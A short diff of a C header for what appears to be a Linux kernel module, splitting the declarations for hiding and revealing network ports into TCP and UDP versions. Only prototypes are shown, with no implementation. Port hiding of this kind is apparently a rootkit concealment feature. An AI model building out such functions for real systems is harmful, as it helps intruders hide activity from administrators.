@@ -7,8 +7,10 @@
 #include <linux/uaccess.h>
 #include <linux/version.h>
 
-void hide_port(char *);
-void show_hidden_port(char *);
+void hide_tcp_port(char *);
+void show_hidden_tcp_port(char *);
+void hide_udp_port(char *);
+void show_hidden_udp_port(char *);
 //void showme(char *);
 
 #endif
